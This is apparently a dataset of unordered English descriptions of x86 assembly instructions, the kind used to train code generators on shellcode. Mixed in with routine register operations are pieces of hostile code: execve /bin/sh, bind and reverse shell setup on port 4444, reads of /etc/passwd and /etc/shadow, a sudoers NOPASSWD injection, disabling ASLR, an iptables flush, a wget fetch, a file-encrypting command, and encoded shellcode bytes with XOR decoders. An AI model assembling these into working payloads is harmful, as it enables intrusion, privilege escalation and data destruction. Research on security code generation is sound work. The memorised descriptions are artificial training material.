if the contents of the eax register is not zero then jump to the label checkforfile
move 4 bytes at memory address esi-4 into eax
go to _zero11 label
set eax to 0
add 2 to the eax register
loading syscall value = 0x58 for reboot in al
push the dword 0x62732f2f onto the stack
copy the address of var into esi
insert the 32bit value 4444 on the stack
define the label 2
declare the main label
push 0 two times
define _loop2 label
push the dword 0x74652f2f onto the stack
point edi to the start of the shellcode
run xor operation between al register and the hexadeciaml value 0x30
if not equal jump to the label nextnumber
save the shellcode in the esi register
decode_pr function
move 0x2f into the byte at address [esp]
declare the fill label
define _closefile label
push the contents of the eax register onto the stack
define _loop label
define the string message and initialize it to '/etc/passwd'
push the host_sockfd
move 0xc into dl
push the dword 0x61747069 onto the stack
add 2 to the contents of esi
decrease ebx by 2
pick up ebx contents from the top of the stack
go to _zero4 label
encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb
decrement the ecx register and jump to the L1 label if the contents of the ecx register is not zero and the zero flag is zero else jump to the shellcode label
load the strig /usr/bin/shred in ebx register
place address of buffer into ebp
if ebx content is not equal to the double word contained into eax register go to next_adrr label else go to eax address
if the contents of the eax register is not zero then jump to the label l4 else call the function search
declare the next_cycle label
resetting eax register
in the function F1 point to the next word in esi
test the contents of the ecx register
define odd_number
save into esp register the syscall command 'int 0x80 and jump back to _stage'
call kernel (exit(0))
compare the dword at the memory location [eax-4] with the value of egg1
push nib/ string on stack
push hexadecimal value 0x2faa68aa on stack
point to the next byte in edx
set the socketcall type to sys_accept
point ebx to stack
push 0-term, tac/, nib/ on the stack
subtract 0xffffffdf from edi
push the value 0x2e312e31 to the stack
zero out eax,ebx and ecx registers
perform an unconditional short jump to _rotate label
load on ecx the pointer to the arguments n the stack into ecx
put syscall sigaction into the eax register
in the function F4 jump to label L1 if the byte specified by the address in esi is lower than 0x1 else subtract 0x1 from the byte at the address in esi and jump to L2
decrement the ecx register and jump to the main_push label if the contents of the ecx register is not zero else move the value 30 into the cl register
jump short to the here label
save the pointer to args in ecx register
add the value 9 to eax and jump to decode if the result is not zero
save edx as a null byte
push 0x69622f2f onto the stack
multiply eax by 2 using left shift
move the value 0x2 into the bl register
jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register
swap the contents of the edi register with the contents of the eax register
increment ebx content two times
define _exit label
go to _zero17 label
define _zero11 label
move dl to the byte pointed by the contents of eax
push the contents of the bx register onto the stack
load the sockfd sotred in eax to esi register and then clean eax register
define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'
define _read label
adds 2 to the first character pointed from esi
transfer the 64 bit of mm0 register to the 64bit register esi
push ebx on stack
if 0 then jump to loc_402b13
pick up edx content from stack
move the contents of the ebp register into the esp register
move bl into the byte at the address edx + eax
push 0-term, hsab, /nib, //e- on the stack
point to the next double word in ecx
push the word 0x3930 onto the stack
jump to label stop if equal
copy the value 5 into al register
move dl into cl
add the value 2 to the contents of the al register
mutliply eax by ecx
load the shellcode in esi
push ip address 192.168.1.133 (hex)
move the contents of the esi register into the long starting at the address [esi+22]
jump short to the push_cmd label
jump short to the two label
jump to _star
push the word 0x5974 onto the stack
define shellcode label
declare _build label
clear the ecx register
move the contents at memory specified by temp into eax
load hexadecimal value 0x68909090 into eax
push ebx and eax on stack
decrement ecx and jumps to the do_dup label unless decrementing ecx caused its value to become zero
put the syscall 15 into the eax register
go to _shellcode label after entering the byte string '/proc/sys/kernel/randomize_va_spacex' address on stack
rotate 4 bits left the byte starting at the address esi
push 0x65726f43 onto the stack
if the zero flag is clear go to address _end+0x5f
move 1 into eax
code for exit syscall
send signal to another process
jump to the label _convert if the contents of the eax register is not zero
if not equal jump short to the _while_loop
push 16 onto the stack (addrlen = 16)
make the system call to install portable signal handler
push 0x656c6966 onto the stack
zero out eax, ebx, ecx and edx registers
push the dword 0x2f2f6e69 onto the stack
clean the edx register and move the next byte of the shellcode into the lower byte of the register
right shift the contents of the edx register by 16
jump short to the get label
move the socketcall in al register
move the first element of array into ecx
push the size of no=2, the pointer to no, the argument ipv6_v6only=26 and the argument ipproto=ipv6 = 41 on stack
clear ebx, ecx and eax registers
move bl into the single byte at the address stored in esi+ecx
go to _zero1c label
move decimal value 10 into ebx
push ASCII /bin/sh onto the stack and point the ebx register to the stack register
move the byte at the address esi + eax into bl
subtract 0x7 from the contents in bl and save the result in bl
zero out eax
subtract 88 from the contents of the al register
perform the xor between bh and the byte in esi+edx
copy the value of sys_listen=4 into bl register
perform a short jump to main_label
push the string v6_host.sin6_addr on stack
pop the value on the stack back into ecx
push 'hsad' on stack
clear eax then execute dork syscall
compare the contents at memory location esi with edx
move ebp into ecx
zero out esi register
push the byte 37 onto the stack
push 0x7369642d to the stack
loop check_even_odd using ecx for counter
declare code section .bss
define the _start label
push the byte 6, 0x1 and 10 on stack
clear eax and execute execve syscall
push the contents of the esp register onto the stack
call the prepare function
push the word 0x0a onto the stack
load __nr_close into eax register
push the byte 0x0 onto the stack
call the iprintlf function
execute __nr_execve syscall
move 0x3f into the byte at address al
define variable choice of 1 byte and initialize to y
make the system call to open the file
execute execve syscall
in the routine F3 jump to label L1 if the current byte of the shellcode is equal to 0x3 else move 0x3 into the byte in esi and jump to L2
subtract ebx from eax
put the syscall 0x2f into the eax register
push the 32 bit register bx on the stack
declare R2 and point to the next byte in esi
define L2 label and jump to L3 label
mov 0xb into lower byte of eax
exchange edx with ecx content
declare the gotocall label
connect
decrement the dl register by one
perform xor operation between ebx register and the word __flag_byte and save the result in ebx
push hexadecimal value 0x5 on stack
copy the hexadecimal value of “.g.o” into ed register
move the code of syscall exit in al register
move the byte 66h into al
increase cl of 1
save socket command, 1, into bl register
clear eax and ebx
push 10 onto the stack
copy ebx content into ecx and eax content into ebx
load __nr_close into al register
zero out the ecx register and push zero onto the stack
if the carry flag or the zero flag are set go to __bss_start+0x1a
declare the data label
jump to 2f if the sign flag is zero
jump to _decoder label
invoke sys_socketcall
define the function D4 and perform the xor operation between the byte in esi and the 0x5 value
xoring hexadecimal value 0x12 with al register
push 0x2 to the stack
add 16 to ecx
declare todo_label
if the contents of the eax register is zero then jump to the label check_html else jump to the while label
move the byte 6h into al
jump to incaddr if no match
in the function F2 negate bl and move bl to the next byte
move 3 to the eax register
zero out ecx and eax register
decrease edx by 4
move the command socketcall = 102 in al register
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the ebx register to the stack register
if the contents of the eax register is not zero then jump to the label l1
next word of the shellcode
push the byte 0x64 onto the stack
jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register
move ecx into esi
jump to the label close if the contents of the eax register is negative
add an immediate operand 65 to byte_value
push the pointer to sockfd on stack
mask out lowest 4 bits of the ecx register
initialize cx to 01
define the jmp_search label
push the dword 0x64777373 onto the stack
push af_inet6 value, 10, on stack
restore the top of the stack into the si register
load hexadecimal value into eax and edx content
define the decode function and perform the xor operation between the byte in esi and the 0xaa value
execute __nr_execve syscall
push 0x3e0a7964 onto the stack
push the word 0x5c11 onto the stack
define shift_decode routine
define egg1 equal to 'mark'
push ipv6 loopback on stack as x4 dword eax
copy eax content into ebx register
define weite_syscall =4
zero out edx register
move the pointer to args into ecx register
move a byte from the address buff+ecx into al
define D2 save the in esi the pointer to the shellcode and move esi into edi
load the effective address of the result of the operation [esi+30] into the edx register
save the value of sys_setcockopt = 14 into bl register
load the string /usr/bin/wget 192.168.1.93//x </dev/null2<&1 in ecx register
move v_src to esi
push 0x8501a8c0 onto the stack
push the byte -1 onto the stack
define the byte string '83h'
push 0x70692f6e onto the stack
push null terminating string on stack
move childmsg into eax
push the word paramenter -c on the stack
compare the contents of edx and the contents of ebx
decrement the ecx register and jump to the eggLoop label if the contents of the ecx register is not zero else jump to the edi register
push the value 0x61702f2f and the value 0x6374652f onto the stack and point the edx register to the stack register
decrement ecx and jumps to the decrypt label unless decrementing ecx caused its value to become zero
define negative label
add 0xb8 to the cl register
subtract 15444 from dx and save the result into dx
point esi to the shellcode and save it into cx
move 0x3 into al
save hexadecimal value 0x1 into al and bl register
load the effective address of the result of the operation [ecx+0bh] into the eax register
initialize edi with 0
move the value 0x3 in cl register
define _zerof label
decoder's main
pop stack(1) into esi
copy edi content into the memory space at the address esp-0x8
jump to the jocker label
load chained null and the arg -vp17771 into esi register
push eax and edx contents on stack
execute exit syscall
load the string “/bin//bash\0” into ebx register
push the contents of the edi register onto the stack
go to _zero2 label
push ip address 127.255.255.254 on stack
make the system call for write
add 0x20 to the contents in esp and save the result in esp
jump to child if zero
move decimal 43 into edx
push 0x64687373 onto the stack
define my_var word variable and initialize it to 0abcdh
xoring the 0xdd value that represent the xor operation with the contents of the memory adddress edi
zero out eax adn ebx registers
zero out ebx
define the _file label
define the _exit label
get the address of shellcode
jump to the memory location loc_402B1D if the contents of the bl register is less than or equal to the value 78h
push ecx onto the stack
load socketcall syscall into eax register
compare the contents at memory location esi and the contents of the edx register
move the syscall sys_connect in bl register
declare the cycle label
define the callme label
replaces the contents of the edx register with its two's complement
push 0x682f2f2f onto the stack
move the value 0x6d6f646e into the double word starting at the address [esp-0x14]
define the byte string '0d8h'
push double word 0x39396e2d onto the stack and point the ebx register to the stack register
move the value 5 into the al register then decrement the contents of the al register and jump to the l2 label if the result is not zero
jump to the read label
push ebx content on the satck and load it into ecx register
right shift the value of register ecx by 2 bits
define google as the byte string '127.1.1.1 google.com'
define two_label
load host_sockfd stored in eax to esi
push 2 into cl register
zero out eaz
move the syscall sys_socket in bl register
define label re
declare loop_label
negate all bits in the byte contained into esi register
jump to not_equal if the current byte of the shellcode is not equal to bl
jump to the label proc_name if the contents of the eax register is zero
dec count by 1
increment ebx by 1
jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi
copy ecx content into ebxx register
define _zero8 label
push inet_addr 192.168.227.129 (hex)
push the dword 0x68732f2f onto the stack
move integer 11 to edx
zero out eax
add 0x30 to esi
push the value 0x0 to the stack
transfer decode value from bl to esi register
load the effective address of the result of the operation [esi+22] into the ecx register
point to the next byte in the edx register
jump to the all label if the operands of the above comparison are equals
save the socket fd contained into eax in edx
declare the jocker label
point to the next double word in edx
decrement edx
if the contents of the al register is equal to the value 0x38 then jump to the memory address 0x40 else push the byte representation of the value 0x1 onto the stack
move 03h into al
clear ebx register
push the byte +0x10 onto the stack
if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD then jump to the wrap_around label
push the dword 0x69622f3a onto the stack
increment edx register
zero out eax and esi registers
push the value 0x6168732f and the value 0x6374652f onto the stack and point the ebx register to the stack register
push nib/ onto stack
define call_decoder_label
move the address of the arguments into ecx
define the function F5, increment edx and jump short to L3
push eax and ebx content on stack
push hs/ in stack
define _params label
clear the ecx register and push its contents onto the stack
load the effective address of the result of the operation [zero_reg+66h] into the eax register
move 0x20 into dl
subtract 0x013ffeff from the contents in eax and save the result in eax
perform an unconditional short jump to _call_shellcode label
define msg_len equal to the length of msg
push eax content on the stack
move the contents of eax into address defined by ebp+var_a
push the size of v4lhost on stack
push the value 0x6873732f and the value 0x6374652f onto the stack and point the esi register to the stack register
decrement loop counter
load the effective address [zero_reg+6] into eax
declare the priv_setuid label
move the address of the stack pointer into ecx
pop 102 into eax
decrement eax content
define enc function and call decoder
if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register
if not zero jump to loc_4010e5
load the arguments previously pushed on stack into register ecx
push hexadecimal value 0x10, ecx and esi contents on stack
exchange edx with eax contents
execute __nr_execve syscall
declare the loader label
save addr of stack into ecx
zero out the eax register and jump to the l3 label if the contents of the edx register is not equal to the contents of the eax register
allocate memory for variable
push the value '-c' on stack
jump to the _return label
compare ebx with eax content. if they are not equal go to _retry label
right shift the contents of the edx register by the byte 16
pop the value on the stack back into edx
jump to connect if equal
zero out the eax and ebx register
declare shellcode_label
declare the call_shellcode label
move the byte at address eax+1 to dl
move stack ptr to ecx
push ecx to the stack
decrement loop-counter
push the doubleword 0x00000000 onto the stack
jump to _read
pop the shellcode address from esi register
pushing null terminator
push the hexadecimal value 0x101017f of ip address on stack
move the value 0x65636170 into the double word starting at the address [esp-0x8]
move ASCII /bin/sh into edx
subtract 8 from the byte in esi and then negate the result
put lenght of encodedshellcode to dl
zero out ebx and eax
transfer aex contents into ebx contents and push ebx on the stack
move sock_reg into ebx
push 'sswd' onto the stack
move 0x7 into bl
move the address of msg string into ebx
compare the contents of the al register and the contents of the cl register
subtract 216 from the value stored in eax
push the word 0x02 onto the stack
define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
declare msg string containing 'hello world!'
convert the doubleword with sign (32 bit) provided in eax into the quadword with sign (64 bit) left in edx:eax (clear eax and edx registers)
push the value 0x1c to the stack
decrement the ecx register and jump to the l1 label if the contents of the ecx register is not zero else move the contents of the esp register into the eax register
load __nr_creat syscall into al register
move 0666 into cx
clear ecx and eax
push the value 0x6e69622f onto the stack
push the byte 0x02 to the stack
push the 0x64777373 onto the stack
load address of -e/bin/bash into ebx
allow permissions r-xr--r—save them into ecx
move the value 0x5 into the al register
syscall execute
save at location ds:0x9501bb9b eax content
move the byte in esi into the al register
push the word 0x1ff onto the stack
push the contents of eax onto the stack
compare the contents of al with the cl register
if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register
define the byte string '/bin/sh'
move 0xffffffff into eax
compare ebx register's lower half value against ascii value 48
declare the start label
decrement counter
move value 0x16 to dl register
move the value 10 into the cl register then decrement the contents of the cl register and jump to the l1 label if the result is not zero
0's out eax and ecx register
go to _zero8 label
if the sign flag equals the overflow flag go to encoded + 0x20 label
as long as sf iss not set, jump to _duploop label
load hexadecimal value 0x14 on edx register
define syscall_execve equal to 11
clear edx and ecx reegsiter
push the values 6, 1 and 10 on stack
define _zero3 label
perform a logical xor between the ecx register and the dh register and save the result in ecx
put the byte L1 into the eax register
clear ecx register
declare a byte containing the value 64 at label the memory location var
move the word at the address ax into [ebp+22]
copy 0x5 into bl register
perform a bound check to array index
load bind =2 into ebx register
add the value 0x1b into the dx register
push edi to the stack
jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register
push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the eax register to the stack register
load edi content into ecx register then clear edx
push 102 onto the stack
push ebx content i on the stack
system call alarm
if the contents of the cl register is greater than the decimal value 12 then jump to the label l2
if eax and ebx content are equal go to _all label
entring db "all all=(all) nopasswd: all" , 0xa address on stack, then jump to _write label
move c to eax
put the syscall 2 into the eax register
clear edx
push '/etcsswd7.7.//pa' on stack
copy the byte 1 into al register
ebx points to the memory struct
define the byte string 'my.txtx'
push the word 0666q onto the stack
decrement the contents of the ecx register and jump to the loop2 label if the result is not negative
pick up ebx content from the register
jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register
if the contents of the al register is equal to the value 0xf2 then jump to the incpage label
push the value 0x6e69622f and the value 0x7273752f onto the stack and point the edx register to the stack register
set dl equal to 13
0's our eax
move the byte in edi into bl
save esp content into ecx
perform a logical and operation between the al register and the 0fh value and store the result in the al register
push ecx on register
jump to the address specified by the operation fupdisasm+3
push the word 0x0f27 onto the stack
add 0x66 to the contents in al and save the result in al
if edi content is not equal to eax content go to _infinite label
push \x00 to the stack
move the return value of socket from eax to ebx ready for the next syscalls
define _decoder label
transfer esp contents into ecx contents
move the byte at the address 6h into al
execute no operation
perform the xor between ch and the byte in esi+edx
push the value 0x7 onto the stack and point edx to the stack register
push the dword 0x2f3a3a30 onto the stack
push edx two times ad esi on the stack and then load the stack pointer into ecx register
push 'ecap' on stack
move the address of msg string into eax
push '/bin' onto the stack
restore the top of the stack into edx register
push the 0x7374736f onto the stack
push 0 onto stack (backlog=0)
if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label
load the address of esi into edi
jump to the _while_loop label if the destination operand is less than the source operand in the above comparison
if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register
define the decoder function and store the encoded shellcode pointer in the esi register
right shift the contents of eax register by 28 bit positions
add 3 to ecx and jump to L3 if the sum is not zero
call sigaction() to check memory location [ecx]
move al into the byte at address [esi+14]
move bl into the byte at address [edx + eax]
move 110 into the effective address saved in ebx
declare _param label
zero out eax and ebx registers
push the value 0x10, ecx content and esi content on stack
pick up ebx content from the stack
move the 3rd element of the byte_table into cl
push eax content as double word for 4 times
load ebx into ecx register
clear aex and push its content on the stack
declare the prepare label
push 0x69622f65 to the stack
jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register
define the _start label and jump short to the call_decoder
put the byte CHMOD_CALL into the eax register
move the contents of the al register into the address pointed by edi
add hexadecimal value 0xe458376a to eax register
negate all the bits of the word at the address ax
jump to the label ready_to_proxy if the contents of the eax register is zero
move al into the byte in esi
jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi
decrement edx content by 1
push the byte 0x1 onto the stack and point ecx to the stack register
push '/nib' on stack
move hexlen into edx
put socket descriptor in ebx and 0x5 in eax
if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register
make kernel call to display line string
jump to the _start label if the zero flag is set
push the value 0x2e323931 onto the stack
system call socketcall
define next_cycle label
perform and operation between si and 01h
zero out ebx register
declare _dup2loop label
move al into the address [esi+13]
move the value 0x1 into the bl register
jump to the carryon label
invoke sys_write
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump to the edx register
decrement ecx and jumps to the main_inc label unless decrementing ecx caused its value to become zero
zero out edx register
compare ecx to 0
if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label
remove last character from the stack into edx
execute __nr_chmod syscall
push the byte 0x4 onto the stack
push edx, eax and ebx on the stack
subtract 1768009314 from the edi register and save the result in edi
replaces the contents of the eax register with its two's complement
push 0x6e7a762d onto the stack
copy the address a tesi+0x1 into edi register
push the word 0xffff onto the stack
move byte 1 onto stack
push 0xa onto the stack
define the _exec label
move the contents of the ebx register into the long starting at the address [esi+26]
reserve 1 byte for variableName1
define main_label
get stack pointer to ecx
load the stack pointer in ecx register
clear ecx and eax register
loading 0x1234567 in ecx
move the value 0x735f6176 into the double word starting at the address [esp-0xc]
jump to label multiplyloop
set first arg in ebx=*filename
compare the doubleword stored at memory location var to the integer value 10
move al into the address [esi+22]
subtract the contents of al register from the contents of dl register and save the result in dl
push 0x7361702f to the stack
save the hexadecimal value 16, ecx contents and esi contents in ecx
add 0x2 to the contents in ebx and save the result in ebx
subtract 4 from the esp content
negate all the bits of the eax register
section for initialized data
move 3 into bl
jump to the call_egghunter label
move the current byte of the shellcode to the bl
make sys_exit kernel call
subtract 0x7 from bl and save the result into bl
declare the function F1 and point the shellcode in esi
push 0x66 onto the stack
increment eax
move the contents stored at the address len into the dl register
section text
push the value 0x64687373 onto the stack and point the ecx register to the stack register
push 0x0a206873 onto the stack
define even_number label
define the doubleword arr and initialize it to 100
jump to callpop
load 0x10 into dl register
jump to the l2 label if the unsigned contents of the al register is greater than the unsigned contents of the bl register else add the value 3 to the eax register
test the contents of the edx register
anding the double word at the adress ebx+0x1a and ecx register
sigaction
system call signal
push the 0x3170762d onto the stack
map the memory page to a file
move al into the address [esp+57]
move 8 decimal into edx
move 1 into ebx
replace r char with 0x0a
push the contents of ebx onto the stack
if the contents of the bl register is greater than the value 78h then jump to the memory location loc_402B1D
jump to the _while_loop if lower
executing syscall
push the word 0x462d to the stack
save /bin/sh in ebx register
push sin6_addr = in6addr_any = ::0
jump to retry if not equal
define F1, negate cl and increment cl to the next byte
add 0x8 to esi
clear the edx register and move the next byte of the shellcode into the lower byte of the register
load 4 into eax
move the singl byte at the memory location specified by the operation [esi+1] into dl
put syscall execve code in al register
push file descriptor on stack
move eatmsg into ecx
push 0x7273752f to the stack
push the doubleword 0x61747069 to the stack
scan the next section of mem
push the 0x2 onto the stack
push 6 onto the stack
go to _decode label
move permissions to read write and execute into ecx
push the number of the port, 4444, on the stack
move v to esi
push hexadecimal value 0x1 on stack
make the system call to get the parent process ID
add 0x21354523 to the contents of esi
move esi into eax
load stack pointer into ecx register
move stack pointer into ecx
move ebx into the address [esi+43]
move edi into ebx
initialize ax to 00
push 0x78 to the stack
perform a bit-wise inversion of the byte starting at the address in esi
load __nr_execve on stack
push the byte 0x2 onto the stack
jump to the label close if the contents of the eax register is zero
push the string '-le//bin//sh' on stack
move the word in ax into the memory location specified by the operation [ebp+22]
clear eax register
define the byte string '8bh'
push the 0x203a4457 onto the stack
jump to the child label if the contents of the eax register is equal to the contents of the ebx register
jump to the label _while_loop if the contents of the eax register is negative
add the contents of the eax register to the contents of edx register
reset ecx to 0
declare message string msg2 containing 'this is how we recycle in nasm'
move 0xff into bl
push 0x53534150 onto the stack
save esp content into ebx register
move 66729180 into edx
subtract 0x70445eaf from the contents in eax and save the result in eax
in the routine F6 jump to label L1 if the byte at the address specified by esi is equal to 0x3 else move 0x3 into the byte in esi and jump to L2
push the string ///etc/hosts on stack
return to the address on the top of the stack
piack up ecx content from stack
push 0x1 onto the stack
count down to zero
move eax into ebx+12
load execve in al register
restore the top of the stack into the ebp register
zero out rdx and push it on stack
decrement ecx and jumps to the up label unless decrementing ecx caused its value to become zero
push edx and the hexadecimal value 0x68735858 on the stack
load the effective address [ebp+24] into ebx
swap the values of ebx and esp registers
define next_page label
push the byte +0x3 onto the stack
push '/etc' on stack
define the _continue label
extend the sign bit of eax register into the edx register
perform xor between al and bl and jump short to shellcode if the result is zero
move eax to x variable
reserve 1 byte for number variable
save the name of the file into esi register
load the effective address of the result of the operation [zero_reg+3] into the eax register
push our socket fd onto the stack
declare key variable equal to the value 0xdeadbeef
move 0xb01 into dx
call kerenl
move the contents of memory address esp into eax
load '/bin//sh\0' intp ebx register
compare the contents of the al register with the value 0xf2
push bx onto the stack
jump to 0x8 if not zero
subtract 1634 from the contents of the bx register
perform a short unconditional jump to _two label
push bx on the stack
zero out ecx
push the 0x69622f65 onto the stack
move the byte in eax into dl
move 0xa2 into al
load the effective address of the result of the operation [zero_reg+3] into the ecx register
push //bin/sh in ebx
push null into the stack
align page address
define filestoread_label
restore the top of the stack into the edx register
push //sh to the stack
if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label
move 30 into cl
xoring eax and edx
increment edi register
set the edx register to null
start loop decode
move 0x5 into ebx
define call_decoded and execute it
move the command socketcall in al register
compare the contents of the dl register and 1h
push double word 0x74652f2f onto the stack and point the ebp register to the stack register
next instruction in the ecx register
if the contents of the al register is equal to the vale 0xaa then jump to the decode_insertion label else perform a logical xor operation between the al register and the bl register and store the result in the al register
push the 0x682f2f2f value onto the stack
load the effective address of the result of the operation [esi+13] into the ebx register
jump short to encodedshellcode if equal
push the word 0x2 to the stack
move eax into edi
swap the contents of eax and ebx
zero out ebx
push 0x7372656f to the stack
reset both lower and uppper bytes of ebx to be 0
system call kill
point to the next word of the shellcode
decrement edi content
push the contents in ogin onto the stack
move 1 into al
push 0x782f2f32 onto the stack
clear interrupt flag
jump back to the dup2loop procedure until ecx equals 0.
define ip address as _ip = 0x0100007f
define the byte string '87h'
clear eax and move 0x4 in the lowest byte of the register
call the main function
save addr of stack into edi
zero out eax and edx
push edi content on the stack
clear ebp register
define string as the byte string 'file.txt'
push the word 0x3905 onto the stack
add the value 3 from the byte in esi and negate it
read
swap the contents in ebp+16 and ecx
push 0x6374652f to the stack
restore the top of the stack into the esp register
load the effective address [zero_reg+66h] into eax
move 10 into eax
jump to the shell label
save sys_connect = 3 into ebx register
load the address of edi+2 into edi
xoring ebp content with the double word at the adress edx-0x55af5540 then go to decoder label
restore the top of the stack into eax register
copy eax content into ebx register
jump short to the EncodedShellcode label if the result of the logical xor between the cl register and the value 0x32 is zero
define myList array of word and initialize it to 1, 2, 3, 4, and 5
move eax content into ebx register
if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label
define check_even_odd label
move n_src to eax
push 0x7273752f onto the stack
call the iprint function
move the value 0xfee1dead into the ebx register
declare the writestring label
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
define _decode label
store the shellcode in esi and move it into cx
declare the up label
increase cl of 1 until the contents of cx is less than or equal to 2 with sign
subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative
invoke subroutine socket
move 0 to stack (protocol=0)
push 0x2f3a706d onto the stack
declare global _start, section .text, _start
push af_inet as a word
define the callpop function
push zero onto the stack
load esp content in ecx
push the pointer to sockaddr and the fd received previously on stack
push 0x45683933 onto the stack
perform a short unconditional jump to call_shellcode label
zero out ax register
move the contents of the esi register into the bx register
move bx into ax
one's complement negation of the byte esi in memory
save 63 into al
lowbound label
save esp content into ebx register
push '/bin' on stack
subtract 15444 from the contents of the dx register
load address of /bin/sh into ebx
decrement the ecx register and jump to the fill label if the contents of the ecx register is not zero else move the contents of the esp register into the ecx register
call _exit
go to next address
if the contents of the al register is equal to 0xf2 then jump to the fillOnes label else move the value 0x59935193 into the eax register
jump to download if zero
define the byte string '24h'
do the logical shift to the right of the edx bits for 16 times the increase them of 1
move ecx into ebx
push the value 0x7461632f and the value 0x6e69622f onto the stack and point the ecx register to the stack register
push '/etc/sudoers' into stack
reserve a word for wordvar
put /bin/sh into the edx register
push '/etc' onto the stack
subtract 13 from the byte at the address esi
move 0102 into cl
push 0x68732f6e to the stack
push sock_stream = 1
move stack pointer to eax
if zero jump to the next_cycle label
define string as the byte string '/bin/sh'
store the address of the shellcode in esi
point edx to the stack pointer
copy esp content into ebx register
declare the fileaddress label
move cl into bl
push the word 0x1b6 to the stack
push double word 0x74652f2f onto the stack and point the edx register to the stack register
push esi on the stack
perform xor operation
perform xor between cl and 0xaa and jump to next_cycle if the result is not zero
pick up edx, esi, edi x2 from the stack
right shift the contents of eax register by 16 bit positions
jump to the _start label if the contents of the al register is equal to the value 0xf2 else move the value 0x50905090 into the eax register
push the sizeof = 0x4 onto the stack
push the contents of the ebp register onto the stack
save in dl register the len of the buffer to write, 4th arg
save socket =1 into bl register
subtract the decimal value 8 from the byte esi in memory
push nib// in stack
clean the ecx register and move the next byte of the shellcode into the lower byte of the register
point to the next byte of the shellcode and jump short to decode
define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register
if the contents of the dl register is greater than the decimal value 27 then jump to the label l3
increase edi and cl contents of 1
multiply eax by the contents of the ecx register
substract 13 from encoded_shellcode, one word at a time
push the 0x6374652f onto the stack
move 2 in cl register
push the pointer to sock addr stored in ecx
jump to the label exit_on_error if the contents of the eax register is not zero
call the me function
load ope syscall number into eax register
define the call_decoder label
subtract 1634 from bx and save the result into bx
push the string ' /bin//sh' on stack
load the effective address of the result of the operation [esi+47] into the edx register
shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4
save /bin/sh in the first free 32bit register
multiply eax by ebx
move the contents of bx into ax
add 24 to eax
set edx = 0x4f904790edx = 0x4f904790
push the pointer to the /tmp/.xe
move the number of bytes of var4 into eax
move address of stack pointer into ecx
jump short to call_shellcode
jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi
define file as the byte string '/sbin/iptables#-f'
save the byte 2 into ecx register
push the byte 10 onto the stack
push 0x2e312e31 onto the stack
clear the edx register and move the current byte of the shellcode into the lowest byte of the register
make the system call open
push the dword 0x61702f2f onto the stack
jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register
get 36 in the ecx
define the _dup2_loop label
set sys_execve = 11 to eax
jump to the label l1 if the contents of the eax register is not zero
